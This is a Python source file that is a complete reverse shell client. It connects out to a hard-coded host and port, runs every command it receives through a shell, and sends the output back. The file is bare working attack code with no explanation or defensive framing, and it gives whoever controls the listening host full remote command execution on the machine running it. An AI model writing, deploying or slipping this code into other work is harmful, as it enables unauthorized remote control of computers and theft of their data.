import subprocess
import socket
import os


host = "192.168.2.103"
port = 65535
socket=socket.socket()
socket.connect((host,port))

while True:
    data=socket.recv(1024)
    if data[:2] == "cd":
        os.chdir(data[3:])

    if len(data)>0:
        command=subprocess.Popen(data[:].decode("utf-8",errors="ignore"),shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        response=str(command.stdout.read(),"utf-8",errors="ignore")
        socket.send(str.encode(response)+str.encode(str(command.stderr.read())))
        print("Response sent")